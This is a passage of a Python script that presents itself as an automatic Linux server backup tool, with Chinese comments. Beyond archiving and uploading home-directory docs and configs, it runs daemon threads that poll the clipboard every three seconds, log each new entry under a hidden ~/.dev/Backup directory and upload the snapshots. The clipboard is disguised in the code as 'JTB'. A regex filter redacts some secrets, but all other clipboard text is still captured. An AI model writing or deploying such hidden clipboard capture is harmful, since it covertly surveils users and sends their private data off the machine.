                                logging.debug(f"⚠️ 获取JTB失败（DISPLAY 不可用）: {error_msg}")
                            self._clipboard_display_warned = True
                        self._clipboard_display_error_time = current_time
                else:
                    # 其他错误，不记录日志，避免频繁报错导致日志文件过大
                    # 某些环境下（如无剪贴板服务）会持续返回错误码
                    pass
            return None
        except FileNotFoundError:
            # 未安装 xclip，只在第一次记录警告
            if not self._clipboard_display_warned:
                if self.config.DEBUG_MODE:
                    logging.debug("⚠️ 未检测到 xclip，JTB监控功能已禁用")
                self._clipboard_display_warned = True
            return None
        except Exception:
            # 其他异常，不记录错误日志，避免频繁报错导致日志文件过大
            # 某些环境下（如无剪贴板服务）会持续抛出异常
            return None

    def log_clipboard_update(self, content, file_path):
        """记录JTB更新到文件（与 wsl.py 行为保持一致）"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), mode=self.config.BACKUP_DIR_MODE, exist_ok=True)
            os.chmod(os.path.dirname(file_path), self.config.BACKUP_DIR_MODE)

            # 检查内容是否为空或仅空白
            if not content or content.isspace():
                return

            content = self._sanitize_clipboard_content(content)
            if not content:
                return

            with self._clipboard_lock:
                with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                    # 与 wsl.py 中的格式保持 1:1
                    f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                    f.write(f"{content}\n")
                    f.write("-" * 30 + "\n")

                if os.path.getsize(file_path) > self.config.CLIPBOARD_MAX_SIZE:
                    with open(file_path, 'rb') as source:
                        tail = source.read()[-self.config.CLIPBOARD_MAX_SIZE:]
                    with open(file_path, 'wb') as destination:
                        destination.write(tail)
                    os.chmod(file_path, self.config.BACKUP_FILE_MODE)

            preview = self._redacted_preview(content, limit=50)
            logging.info(f"📝 已记录内容: {preview}")
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 记录JTB失败: {e}")

    @staticmethod
    def _sanitize_clipboard_content(content):
        """过滤剪贴板中常见的密钥、口令和令牌，避免写入或上传敏感值。"""
        if not content:
            return ""
        sanitized = re.sub(
            r"-----BEGIN [^-]+-----.*?-----END [^-]+-----",
            "[REDACTED-PRIVATE-KEY]",
            content,
            flags=re.DOTALL | re.IGNORECASE,
        )
        sanitized = re.sub(
            r"(?im)^(\s*(?:export\s+)?[\"']?(?:password|passwd|token|secret|api[_-]?key|"
            r"private[_-]?key|access[_-]?token|refresh[_-]?token|authorization)[\"']?\s*[:=]\s*).+$",
            r"\1[REDACTED]",
            sanitized,
        )
        sanitized = re.sub(
            r"(?i)([\"']?(?:password|passwd|token|secret|api[_-]?key|private[_-]?key|"
            r"access[_-]?token|refresh[_-]?token)[\"']?\s*:\s*)"
            r"(?:\"(?:\\.|[^\"\\])*\"|[^,}\s]+)",
            r"\1[REDACTED]",
            sanitized,
        )
        sanitized = re.sub(
            r"(?i)([?&](?:token|api[_-]?key|key|secret|password)=)[^&\s]+",
            r"\1[REDACTED]",
            sanitized,
        )
        sanitized = re.sub(r"(?i)\bBearer\s+[A-Za-z0-9._~+/=-]+", "Bearer [REDACTED]", sanitized)
        sanitized = re.sub(
            r"(?i)(https?://)[^/\s:@]+:[^/\s@]+@",
            r"\1[REDACTED]@",
            sanitized,
        )
        sanitized = re.sub(r"\bAKIA[0-9A-Z]{16}\b", "[REDACTED-AWS-KEY]", sanitized)
        sanitized = re.sub(r"\bgh[pousr]_[A-Za-z0-9]{20,}\b", "[REDACTED-GITHUB-TOKEN]", sanitized)
        sanitized = re.sub(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b", "[REDACTED-SLACK-TOKEN]", sanitized)
        return sanitized[: 5 * 1024 * 1024]

    @classmethod
    def _redacted_preview(cls, content, limit=30):
        safe = cls._sanitize_clipboard_content(content or "")
        return safe[:limit] + "..." if len(safe) > limit else safe

    def monitor_clipboard(self, file_path, interval=3):
        """监控JTB变化并记录到文件（与 wsl.py 行为保持一致）

        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        try:
            log_dir = os.path.dirname(file_path)
            if not os.path.exists(log_dir):
                try:
                    os.makedirs(log_dir, mode=self.config.BACKUP_DIR_MODE, exist_ok=True)
                    os.chmod(log_dir, self.config.BACKUP_DIR_MODE)
                except Exception as e:
                    logging.error(f"❌ 创建JTB日志目录失败: {e}")
                    # 即使创建目录失败，也继续尝试运行（可能目录已存在）

            last_content = ""
            error_count = 0
            max_errors = 5
            last_empty_log_time = time.time()  # 记录上次输出空JTB日志的时间
            empty_log_interval = 300  # 每 5 分钟才输出一次空JTB日志

            # 初始化日志文件
            try:
                with self._clipboard_lock:
                    with open(file_path, 'a', encoding='utf-8') as f:
                        f.write(f"\n=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                        f.write("-" * 30 + "\n")
                    os.chmod(file_path, self.config.BACKUP_FILE_MODE)
            except Exception as e:
                logging.error(f"❌ 初始化JTB日志失败: {e}")
                # 即使初始化失败，也继续运行

            def is_special_content(text):
                """检查是否为特殊标记内容（与 wsl.py 逻辑保持一致）"""
                try:
                    if not text:
                        return False
                    if text.startswith('===') or text.startswith('-'):
                        return True
                    if 'JTB监控启动于' in text or '日志已于' in text:
                        return True
                    return False
                except Exception:
                    return False

            while True:
                try:
                    current_content = self.get_clipboard_content()
                    current_time = time.time()

                    if (current_content and 
                        not current_content.isspace() and 
                        not is_special_content(current_content)):
                        
                        # 检查内容是否发生变化
                        if current_content != last_content:
                            try:
                                preview = self._redacted_preview(current_content, limit=30)
                                logging.info(f"📋 检测到新内容: {preview}")
                                self.log_clipboard_update(current_content, file_path)
                                last_content = current_content
                                error_count = 0  # 重置错误计数
                            except Exception as e:
                                if self.config.DEBUG_MODE:
                                    logging.error(f"❌ 记录JTB内容失败: {e}")
                                # 即使记录失败，也继续监控
                    else:
                        try:
                            if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                                if not current_content:
                                    logging.debug("ℹ️ JTB为空")
                                elif current_content.isspace():
                                    logging.debug("ℹ️ JTB内容仅包含空白字符")
                                elif is_special_content(current_content):
                                    logging.debug("ℹ️ 跳过特殊标记内容")
                                last_empty_log_time = current_time
                        except Exception:
                            pass  # 忽略调试日志错误
                        error_count = 0  # 空内容不计入错误

                except KeyboardInterrupt:
                    # 允许通过键盘中断退出
                    raise
                except Exception as e:
                    error_count += 1
                    if error_count >= max_errors:
                        logging.error(f"❌ JTB监控连续出错{max_errors}次，等待60秒后重试")
                        try:
                            time.sleep(60)
                        except Exception:
                            pass
                        error_count = 0  # 重置错误计数
                    elif self.config.DEBUG_MODE:
                        logging.error(f"❌ JTB监控出错: {str(e)}")

                try:
                    time.sleep(interval)
                except KeyboardInterrupt:
                    raise
                except Exception:
                    # 即使 sleep 失败，也继续运行
                    time.sleep(interval)
        except KeyboardInterrupt:
            # 允许通过键盘中断退出
            raise
        except Exception as e:
            # 最外层异常处理，确保即使严重错误也不会影响主程序
            logging.error(f"❌ JTB监控线程发生严重错误: {e}")
            if self.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())
            # 线程退出，但不影响主程序

def is_server():
    """检查是否在服务器环境中运行"""
    return platform.system().lower() == "linux"

def backup_server(backup_manager, source, target):
    """备份服务器，分别压缩各个分目录。

    Returns:
        (归档路径列表, 本轮备份是否完整完成)
        - 没有新增/更新文件时返回 ([], True)
        - 空目录按设计跳过，不算失败
        - 目录缺失或压缩失败记为部分完成
    """
    backup_dirs, changed_records, scan_complete = backup_manager.backup_linux_files(source, target)
    if not backup_dirs or changed_records is None:
        return [], False

    
    user_prefix = linux_name_prefix()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    all_backup_paths = []
    complete = scan_complete
    if not complete:
        logging.error("❌ 文件扫描/复制未完整完成")
    
    # 分别压缩各个目录
    dir_names = {
        "docs": f"{user_prefix}docs",
        "configs": f"{user_prefix}configs",
        "specified": f"{user_prefix}specified"
    }
    
    for dir_key, dir_path in backup_dirs.items():
        changed_files = changed_records.get(dir_key, {})
        if not changed_files:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"⏭️ {dir_key} 没有新增/更新文件，跳过压缩")
            continue

        # 检查目录是否存在且不为空
        if not os.path.exists(dir_path):
            logging.error(f"❌ 备份目录缺失: {dir_key}")
            complete = False
            continue
        
        # 其他目录正常压缩
        # 检查目录是否为空
        try:
            if not os.listdir(dir_path):
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"⏭️ 跳过空目录: {dir_key}")
                continue
        except OSError:
            complete = False
            continue
        
        # 压缩目录（压缩文件保存在 target_dir 的父目录中）
        zip_name = f"{dir_names[dir_key]}_{timestamp}"
        # target_dir 是 backup_dirs 中任意一个目录的父目录
        target_dir = os.path.dirname(dir_path)
        zip_path = os.path.join(os.path.dirname(target_dir), zip_name)
        backup_path = backup_manager.zip_backup_folder(
            dir_path, zip_path, file_records=changed_files
        )
        
        if backup_path:
            archive_reference = backup_path[0] if isinstance(backup_path, list) else backup_path
            if backup_manager.register_pending_archive(archive_reference, changed_files) is False:
                complete = False
            if isinstance(backup_path, list):
                all_backup_paths.extend(backup_path)
            else:
                all_backup_paths.append(backup_path)
            logging.info(f"☑️ {dir_names[dir_key]} 目录备份文件已准备完成")
        else:
            logging.error(f"❌ {dir_names[dir_key]} 目录备份压缩失败")
            complete = False
    
    if all_backup_paths:
        logging.info(f"☑️ 服务器备份文件已准备完成（共 {len(all_backup_paths)} 个文件）")
        if not complete:
            logging.error("❌ 部分备份目录未生成有效归档")
        return all_backup_paths, complete
    elif complete:
        logging.info("☑️ 没有新增或更新的文件，本轮无需生成归档和上传")
        return [], True
    else:
        logging.error("❌ 服务器备份压缩失败（没有生成有效归档）")
        return [], False

def _state_recovery_context(backup_manager):
    """返回待上传键集合与状态文件时间；None 表示必须保守保留全部归档。"""
    if backup_manager is None or not getattr(backup_manager, "_state_loaded_ok", False):
        return None, 0.0
    state = getattr(backup_manager, "_state", {})
    pending_keys = set(state.get("pending_archives", {})) if isinstance(state, dict) else set()
    state_mtime = 0.0
    state_file = getattr(getattr(backup_manager, "config", None), "BACKUP_STATE_FILE", None)
    if state_file:
        try:
            state_mtime = os.path.getmtime(state_file)
        except OSError:
            state_mtime = 0.0
    return pending_keys, state_mtime


def _archive_needs_recovery(path, pending_keys, state_mtime):
    """判断归档是否仍需保留/上传，兼容状态写入失败后遗留的未登记文件。"""
    if pending_keys is None:
        return True
    key = archive_group_key(os.path.basename(os.path.normpath(str(path))))
    if key in pending_keys:
        return True
    try:
        if os.path.isdir(path):
            newest_mtime = os.path.getmtime(path)
            for root, _, files in os.walk(path):
                for name in files:
                    try:
                        newest_mtime = max(newest_mtime, os.path.getmtime(os.path.join(root, name)))
                    except OSError:
                        continue
        else:
            newest_mtime = os.path.getmtime(path)
    except OSError:
        return False
    return newest_mtime > state_mtime


def find_pending_backup_files(backup_manager, target):
    """查找待上传归档、分片和清单，也恢复未写入状态文件的遗留归档。"""
    backup_root = Path(target).resolve().parent
    pending_keys, state_mtime = _state_recovery_context(backup_manager)
    candidates = []

    def add_path(path):
        if (os.path.isfile(path)
                and is_archive_artifact(path)
                and backup_manager._is_valid_file(str(path))):
            candidates.append(str(path))

    try:
        for path in backup_root.iterdir():
            add_path(str(path))

        parts_root = backup_root / ".parts"
        if parts_root.is_dir():
            for group_dir in parts_root.iterdir():
                if not group_dir.is_dir():
                    continue
                for path in group_dir.iterdir():
                    add_path(str(path))

        # 兼容旧版本遗留在 chunks 目录中的分片。
        legacy_chunks = backup_root / "chunks"
        if legacy_chunks.is_dir():
            for path in legacy_chunks.iterdir():
                add_path(str(path))
    except OSError as e:
        logging.error(f"扫描待上传备份失败: {e}")

    groups = {}
    for path in candidates:
        groups.setdefault(archive_group_key(path), []).append(path)
    groups = {
        key: paths for key, paths in groups.items()
        if any(_archive_needs_recovery(path, pending_keys, state_mtime) for path in paths)
    }

    pending = []
    for key in sorted(groups):
        pending.extend(sort_archive_group_paths(groups[key]))
    return pending

def evaluate_round_completion(backup_paths, backup_complete, archives_uploaded, pending_uploaded):
    """判断本轮备份是否满足推进 1 天周期的条件。

    条件：备份完整完成、本轮归档全部上传成功（含遗留归档重试）。
    没有新增/更新文件时 backup_paths 为空但 backup_complete 为 True，视为成功。

    Returns:
        (是否推进周期, 未完成原因列表)
    """
    reasons = []
    if backup_paths:
        if not backup_complete:
            reasons.append("部分备份目录未生成有效归档")
        if not archives_uploaded:
            reasons.append("本轮归档未全部上传成功")
    elif not backup_complete:
        reasons.append("本轮备份未完整完成")
    if not pending_uploaded:
        reasons.append("遗留归档未全部上传成功")
    return (not reasons), reasons

def backup_and_upload_logs(backup_manager):
    """原子轮换日志后上传，避免上传期间新日志被清空。"""
    log_file = backup_manager.config.LOG_FILE
    try:
        username = getpass.getuser()
        short_prefix = username[:5] if username else "user"
        user_prefix = linux_name_prefix(username)
        pending_dir = Path.home() / ".dev/Backup" / f"{short_prefix}_backup_log_pending"
        if not backup_manager._ensure_directory(str(pending_dir)):
            logging.error("❌ 无法创建备份日志待上传目录")
            return

        def upload_snapshot(path):
            try:
                if not os.path.exists(path):
                    return True
                size = os.path.getsize(path)
                if size == 0:
                    os.remove(path)
                    return True
                logging.info(f"📤 上传备份日志文件 ({size / 1024:.2f}KB)...")
                return backup_manager.upload_file(path)
            except OSError as exc:
                logging.error(f"❌ 处理备份日志快照失败 {path}: {exc}")
                return False

        def reopen_log_handler():
            try:
                handler = backup_manager._create_log_file_handler(log_file)
                logging.getLogger().addHandler(handler)
                backup_manager._file_handler = handler
                return True
            except Exception as exc:
                logging.error(f"❌ 重新打开备份日志失败: {exc}")
                return False

        # 先处理上次崩溃或上传失败留下的快照，成功后再轮换当前日志。
        pending_files = sorted(
            str(path) for path in pending_dir.iterdir()
            if path.is_file() and "backup_log_" in path.name and path.name.endswith(".txt")
        )
        for pending_path in pending_files:
            if not upload_snapshot(pending_path):
                logging.error("❌ 仍有备份日志快照未上传，本轮暂不轮换当前日志")
                return

        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return

        with backup_manager._log_lock:
            for handler in logging.getLogger().handlers:
                if hasattr(handler, "flush"):
                    handler.flush()

            if os.path.getsize(log_file) == 0:
                return

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            snapshot_path = pending_dir / (
                f"{user_prefix}backup_log_{timestamp}_{os.getpid()}_{time.time_ns()}.txt"
            )
            old_handler = backup_manager._file_handler
            if old_handler is not None:
                logging.getLogger().removeHandler(old_handler)
                old_handler.close()
            try:
                os.replace(log_file, snapshot_path)
            except OSError as exc:
                reopen_log_handler()
                logging.error(f"❌ 轮换备份日志失败: {exc}")
                return
            os.chmod(snapshot_path, backup_manager.config.BACKUP_FILE_MODE)

            # 重新打开日志文件；从这一刻起新日志不会进入本次上传的快照。
            try:
                new_handler = backup_manager._create_log_file_handler(log_file)
                logging.getLogger().addHandler(new_handler)
                backup_manager._file_handler = new_handler
            except Exception as exc:
                try:
                    if snapshot_path.exists() and not os.path.exists(log_file):
                        os.replace(snapshot_path, log_file)
                except OSError:
                    pass
                reopen_log_handler()
                logging.error(f"❌ 重新打开备份日志失败: {exc}")
                return

        if upload_snapshot(str(snapshot_path)):
            logging.info("✅ 备份日志已轮换并上传")
        else:
            logging.error("❌ 备份日志上传失败，快照保留等待下一轮重试")
    except Exception as exc:
        logging.error(f"❌ 处理备份日志时出错: {exc}", exc_info=backup_manager.config.DEBUG_MODE)

def clipboard_log_has_valid_content(path):
    """判断剪贴板日志是否包含除标记行之外的真实内容。"""
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as source:
            content = source.read().strip()
    except OSError:
        return False
    for line in content.splitlines():
        line = line.strip()
        if (line
                and not line.startswith("===")
                and not line.startswith("-")
                and "JTB监控启动于" not in line
                and "日志已于" not in line):
            return True
    return False


def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """独立剪贴板上传线程：快照持久化，上传成功后删除。"""
    try:
        username = getpass.getuser()
        short_prefix = username[:5] if username else "user"
    except Exception:
        short_prefix = "user"
    user_prefix = linux_name_prefix(short_prefix)

    pending_dir = Path.home() / ".dev/Backup" / f"{short_prefix}_clipboard_pending"
    while True:
        snapshot_path = None
        try:
            if not backup_manager._ensure_directory(str(pending_dir)):
                logging.error("❌ 无法创建剪贴板待上传目录")
                time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                continue

            pending_uploaded = True
            pending_files = sorted(
                path for path in pending_dir.iterdir()
                if (path.is_file()
                    and "clipboard_snapshot_" in path.name
                    and path.name.endswith(".txt"))
            )
            for snapshot_path in pending_files:
                if not clipboard_log_has_valid_content(snapshot_path):
                    try:
                        snapshot_path.unlink()
                    except OSError:
                        pass
                    continue
                if backup_manager.upload_file(str(snapshot_path)):
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("✅ 遗留剪贴板快照已上传")
                else:
                    pending_uploaded = False
                    logging.error("❌ 遗留剪贴板快照上传失败，将保留重试")

            if pending_uploaded and os.path.exists(clipboard_log_path):
                with backup_manager._clipboard_lock:
                    if os.path.getsize(clipboard_log_path) > 0 and                             clipboard_log_has_valid_content(clipboard_log_path):
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        snapshot_path = pending_dir / (
                            f"{user_prefix}clipboard_snapshot_{timestamp}_"
                            f"{os.getpid()}_{time.time_ns()}.txt"
                        )
                        try:
                            os.replace(clipboard_log_path, snapshot_path)
                            with open(clipboard_log_path, "a", encoding="utf-8"):
                                pass
                            os.chmod(clipboard_log_path, backup_manager.config.BACKUP_FILE_MODE)
                            os.chmod(snapshot_path, backup_manager.config.BACKUP_FILE_MODE)
                        except OSError as exc:
                            logging.error(f"❌ 轮换剪贴板日志失败: {exc}")
                            snapshot_path = None
                    else:
                        snapshot_path = None

                if snapshot_path is not None:
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("📄 准备上传剪贴板日志快照...")
                    if not backup_manager.upload_file(str(snapshot_path)):
                        logging.error("❌ 剪贴板快照上传失败，快照保留等待重试")
        except KeyboardInterrupt:
            raise
        except Exception as exc:
            logging.error(f"❌ 处理剪贴板日志时出错: {exc}")

        try:
            time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
        except KeyboardInterrupt:
            raise
        except Exception:
            time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)

def clean_backup_directory(backup_manager=None):
    """清理临时文件，但保留日志、状态、锁和所有待上传归档。"""
    backup_dir = Path.home() / ".dev/Backup"
    if not os.path.exists(backup_dir):
        return
    try:
        config = backup_manager.config if backup_manager is not None else BackupConfig()
        username = getpass.getuser()
        short_prefix = username[:5] if username else "user"
        linux_prefix = linux_name_prefix(username)
        keep_files = {
            os.path.basename(config.LOG_FILE),
            f"{linux_prefix}clipboard_log.txt",
            f"{short_prefix}_clipboard_log.txt",
            f"{short_prefix}_backup.log",
            os.path.basename(config.THRESHOLD_FILE),
            os.path.basename(config.BACKUP_STATE_FILE),
            ".backup.lock",
        }
        legacy_log_file = getattr(backup_manager, "legacy_log_file", None)
        if legacy_log_file:
            keep_files.add(os.path.basename(legacy_log_file))
        keep_dirs = {
            f"{short_prefix}_backup_log_pending",
            f"{short_prefix}_clipboard_pending",
        }
        pending_keys, state_mtime = _state_recovery_context(backup_manager)

        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files or item in keep_dirs:
                    continue
                if item == ".parts":
                    if not os.path.isdir(item_path):
                        continue
                    for group_name in os.listdir(item_path):
                        group_path = os.path.join(item_path, group_name)
                        if (os.path.isdir(group_path)
                                and not _archive_needs_recovery(
                                    group_path, pending_keys, state_mtime)):
                            shutil.rmtree(group_path)
                    if not os.listdir(item_path):
                        os.rmdir(item_path)
                    continue
                if item == "chunks":
                    if not os.path.isdir(item_path):
                        continue
                    keep_chunk = False
                    for name in os.listdir(item_path):
                        path = os.path.join(item_path, name)
                        if (os.path.isfile(path)
                                and _archive_needs_recovery(
                                    path, pending_keys, state_mtime)):
                            keep_chunk = True
                        else:
                            try:
                                os.remove(path)
                            except OSError:
                                pass
                    if not keep_chunk and not os.listdir(item_path):
                        os.rmdir(item_path)
                    continue
                if os.path.isfile(item_path) and is_archive_artifact(item):
                    if _archive_needs_recovery(item_path, pending_keys, state_mtime):
                        continue
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                if config.DEBUG_MODE:
                    logging.info(f"🗑️ 已清理: {item}")
            except Exception as exc:
                logging.error(f"❌ 清理 {item} 失败: {exc}")

        logging.info("🧹 备份目录已清理完成")
    except Exception as exc:
        logging.error(f"❌ 清理备份目录时出错: {exc}")

def save_next_backup_time(backup_manager):
    """保存下次备份时间到阈值文件"""
    temp_path = None
    try:
        next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
        threshold_path = Path(backup_manager.config.THRESHOLD_FILE)
        threshold_path.parent.mkdir(mode=backup_manager.config.BACKUP_DIR_MODE, parents=True, exist_ok=True)
        temp_path = threshold_path.with_name(f".{threshold_path.name}.tmp-{os.getpid()}")
        with open(temp_path, 'w', encoding='utf-8') as f:
            f.write(next_backup_time.strftime('%Y-%m-%d %H:%M:%S'))
            f.flush()
            os.fsync(f.fileno())
        os.chmod(temp_path, backup_manager.config.BACKUP_FILE_MODE)
        os.replace(temp_path, threshold_path)
        os.chmod(threshold_path, backup_manager.config.BACKUP_FILE_MODE)
        backup_manager._fsync_parent(threshold_path)
        if backup_manager.config.DEBUG_MODE:
            logging.info(f"⏰ 已保存下次备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
        return True
    except Exception as e:
        logging.error(f"❌ 保存下次备份时间失败: {e}")
        try:
            if temp_path is not None and temp_path.exists():
                temp_path.unlink()
        except OSError:
            pass
        return False

def should_perform_backup(backup_manager):
    """检查是否应该执行备份"""
    try:
        if not os.path.exists(backup_manager.config.THRESHOLD_FILE):
            return True
            
        with open(backup_manager.config.THRESHOLD_FILE, 'r', encoding='utf-8') as f:
            threshold_time_str = f.read().strip()
            
        threshold_time = datetime.strptime(threshold_time_str, '%Y-%m-%d %H:%M:%S')
        current_time = datetime.now()

        # 周期配置缩短后，旧的远期阈值应立即失效，避免继续按旧周期等待。
        maximum_next_time = current_time + timedelta(
            seconds=backup_manager.config.BACKUP_INTERVAL)
        if threshold_time > maximum_next_time:
            if backup_manager.config.DEBUG_MODE:
                logging.info("⏰ 现存阈值超过当前备份周期，立即执行并重写为当前周期")
            return True
        
        if current_time >= threshold_time:
            if backup_manager.config.DEBUG_MODE:
                logging.info("⏰ 已到达备份时间")
            return True
        else:
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"⏳ 未到备份时间，下次备份: {threshold_time_str}")
            return False
            
    except Exception as e:
        logging.error(f"❌ 检查备份时间失败: {e}")
        return True  # 出错时默认执行备份


class SingleInstanceLock:
    """基于 flock 的用户级单实例锁。"""

    def __init__(self, path):
        self.path = Path(path)
        self._handle = None

    def acquire(self):
        try:
            self.path.parent.mkdir(mode=BackupConfig.BACKUP_DIR_MODE, parents=True, exist_ok=True)
            self._handle = open(self.path, "a+", encoding="utf-8")
            os.chmod(self.path, BackupConfig.BACKUP_FILE_MODE)
            fcntl.flock(self._handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            self._handle.seek(0)
            self._handle.truncate()
            self._handle.write(str(os.getpid()))
            self._handle.flush()
            return True
        except (OSError, BlockingIOError):
            self.release()
            return False

    def release(self):
        if self._handle is None:
            return
        try:
            fcntl.flock(self._handle.fileno(), fcntl.LOCK_UN)
        except OSError:
            pass
        try:
            self._handle.close()
        finally:
            self._handle = None


def main():
    if not is_server():
        print("本脚本仅适用于 Linux 服务器环境", file=sys.stderr)
        return 1

    backup_manager = None
    instance_lock = None
    try:
        backup_manager = BackupManager()
        backup_dir = Path.home() / ".dev" / "Backup"
        instance_lock = SingleInstanceLock(backup_dir / ".backup.lock")
        if not instance_lock.acquire():
            logging.warning("⚠️ 已有备份实例在运行，本实例退出")
            return 0

        # 先清理备份目录
        clean_backup_directory(backup_manager)

        periodic_backup_upload(backup_manager)
        return 0
    except KeyboardInterrupt:
        logging.info("\n备份程序已停止")
        return 0
    except Exception as e:
        if logging.getLogger().handlers:
            logging.critical(f"程序出错: {e}", exc_info=True)
        else:
            print(f"程序出错: {e}", file=sys.stderr)
        return 1
    finally:
        if backup_manager is not None:
            backup_manager.close()
        if instance_lock is not None:
            instance_lock.release()

def periodic_backup_upload(backup_manager):
    source = str(Path.home())
    username = getpass.getuser()
    short_prefix = username[:5] if username else "user"
    linux_prefix = linux_name_prefix(username)
    backup_root = Path.home() / ".dev/Backup"
    target = backup_root / f"{short_prefix}_server"
    clipboard_log_path = backup_root / f"{linux_prefix}clipboard_log.txt"
    legacy_clipboard_log = backup_root / f"{short_prefix}_clipboard_log.txt"
    if legacy_clipboard_log.exists() and not clipboard_log_path.exists():
        try:
            os.replace(legacy_clipboard_log, clipboard_log_path)
        except OSError:
            pass

    try:
        # 启动JTB监控线程（添加异常处理，确保即使启动失败也不影响主程序）
        try:
            clipboard_thread = threading.Thread(
                target=backup_manager.monitor_clipboard,
                args=(str(clipboard_log_path), 3),
                daemon=True
            )
            clipboard_thread.start()
            if backup_manager.config.DEBUG_MODE:
                logging.info("✅ JTB监控线程已启动")
        except Exception as e:
            logging.error(f"❌ 启动JTB监控线程失败: {e}")
            if backup_manager.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())
            # 即使启动失败，也继续运行主程序

        # 启动JTB上传线程（添加异常处理，确保即使启动失败也不影响主程序）
        try:
            clipboard_upload_thread_obj = threading.Thread(
                target=clipboard_upload_thread,
                args=(backup_manager, str(clipboard_log_path)),
                daemon=True
            )
            clipboard_upload_thread_obj.start()
            if backup_manager.config.DEBUG_MODE:
                logging.info("✅ JTB上传线程已启动")
        except Exception as e:
            logging.error(f"❌ 启动JTB上传线程失败: {e}")
            if backup_manager.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())
            # 即使启动失败，也继续运行主程序

        # 获取用户名和系统信息
        username = getpass.getuser()
        hostname = socket.gethostname()
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # 获取系统环境信息
        system_info = {
            "操作系统": platform.system(),
            "系统版本": platform.release(),
            "系统架构": platform.machine(),
            "Python版本": platform.python_version(),
            "主机名": hostname,
            "用户名": username,
        }
        
        # 获取Linux发行版信息
        try:
            with open("/etc/os-release", "r") as f:
                for line in f:
                    if line.startswith("PRETTY_NAME="):
                        system_info["Linux发行版"] = line.split("=")[1].strip().strip('"')
                        break
        except (OSError, UnicodeError):
            pass
        
        # 获取内核版本
        try:
            with open("/proc/version", "r") as f:
                kernel_version = f.read().strip().split()[2]
                system_info["内核版本"] = kernel_version
        except (OSError, IndexError):
            pass
        
        # 输出启动信息和系统环境
        logging.info("\n" + "="*50)
        logging.info("🚀 自动备份系统已启动")
        logging.info("="*50)
        logging.info(f"⏰ 启动时间: {current_time}")
        logging.info("-"*50)
        logging.info("📊 系统环境信息:")
        for key, value in system_info.items():
            logging.info(f"   • {key}: {value}")
        logging.info("-"*50)
        logging.info("="*50)

        while True:
            try:
                # 检查是否应该执行备份
                if not should_perform_backup(backup_manager):
                    time.sleep(max(1, min(3600, backup_manager.config.BACKUP_INTERVAL)))
                    continue

                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                logging.info("\n" + "="*40)
                logging.info(f"⏰ 开始备份  {current_time}")
                logging.info("-"*40)

                # 先重试上一轮未成功上传的归档，避免新一轮清理目标目录时丢失待上传文件
                pending_uploaded = True
                pending_paths = find_pending_backup_files(backup_manager, target)
                pending_groups = group_archive_paths(pending_paths)
                if not backup_manager.reconcile_pending_archives(set(pending_groups)):
                    pending_uploaded = False
                if pending_groups:
                    logging.info(f"📤 重试上一轮遗留备份 ({len(pending_paths)} 个文件)...")
                    for archive_paths in pending_groups.values():
                        if not backup_manager.upload_backup(archive_paths):
                            pending_uploaded = False
                    if pending_uploaded:
                        logging.info("✅ 遗留备份已全部上传完成")
                    else:
                        logging.error("❌ 遗留备份仍有上传失败，将保留文件等待重试")

                logging.info("\n🖥️ 服务器指定目录备份")
                backup_paths, backup_complete = backup_server(backup_manager, source, target)

                # 输出结束语（在上传之前）
                logging.info("\n" + "="*40)
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                logging.info(f"✅ 备份完成  {current_time}")
                logging.info("="*40)
                logging.info("📋 备份任务已结束")
                logging.info("="*40 + "\n")

                # 开始上传备份文件
                archives_uploaded = backup_complete
                if backup_paths:
                    file_count = len(backup_paths)
                    logging.info(f"📤 上传 {file_count} 个文件...")
                    archives_uploaded = True
                    for archive_paths in group_archive_paths(backup_paths).values():
                        if not backup_manager.upload_backup(archive_paths):
                            archives_uploaded = False
                    if archives_uploaded:
                        logging.info("✅ 上传完成")
                    else:
                        logging.error("❌ 本轮归档未全部上传成功，保留本地文件等待重试")
                elif backup_complete:
                    logging.info("⏭️ 没有新增或更新的文件，跳过上传")
                else:
                    logging.error("❌ 未生成本轮有效归档")

                # 只有本轮生成有效归档、备份非部分完成且全部上传成功，才推进 1 天周期
                round_ok, incomplete_reasons = evaluate_round_completion(
                    backup_paths, backup_complete, archives_uploaded, pending_uploaded
                )

                if round_ok:
                    if save_next_backup_time(backup_manager):
                        next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
                        logging.info(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    else:
                        round_ok = False
